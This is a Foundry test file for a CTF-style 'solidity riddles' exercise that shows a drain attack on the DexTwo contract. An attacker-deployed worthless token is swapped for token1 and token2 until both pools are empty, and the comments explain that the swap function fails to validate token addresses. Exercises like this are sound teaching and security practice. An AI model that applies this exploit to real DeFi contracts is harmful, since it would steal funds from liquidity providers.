// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.15;

import {Test} from "forge-std/Test.sol";
import "../../src/solidity-riddles/Dex2.sol";

/// @title AttackDexTwo_Test
/// @author Surbhi Audichya
contract AttackDexTwo_Test is Test {
    DexTwo private dexTwo;
    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;
    SwappableTokenTwo private randomToken;

    address private attacker = makeAddr("attacker");

    function setUp() public {
        dexTwo = new DexTwo();
        token1 = new SwappableTokenTwo(address(dexTwo), "token1", "token1", 110);
        token2 = new SwappableTokenTwo(address(dexTwo), "token1", "token1", 110);
        dexTwo.setTokens(address(token1), address(token2));
        dexTwo.approve(address(dexTwo), 100);
        dexTwo.add_liquidity(address(token1), 100);
        dexTwo.add_liquidity(address(token2), 100);
        token1.transfer(attacker, 10);
        token2.transfer(attacker, 10);

        vm.startPrank(attacker);
        randomToken = new SwappableTokenTwo(address(dexTwo), "random token", "RT", type(uint256).max);
        vm.stopPrank();
    }

    // Attacker deploy a random token and swap it for token1 and token2 to drain Dex2
    // because Dex2 swap function is missing proper checks
    function test_AttackDexTwo() external {
        vm.startPrank(attacker);
        // send 100 random token to dex2
        randomToken.transfer(address(dexTwo), 100);
        randomToken.approve(attacker, address(dexTwo), type(uint256).max);
        // getSwapAmount will return 100 * 100 / 100 = 100
        dexTwo.swap(address(randomToken), dexTwo.token1(), 100);
        // getSwapAmount will return 200 * 100 / 200 = 100
        dexTwo.swap(address(randomToken), dexTwo.token2(), 200);
        vm.stopPrank();
        assertEq(token1.balanceOf(address(dexTwo)), 0);
        assertEq(token2.balanceOf(address(dexTwo)), 0);
    }
}
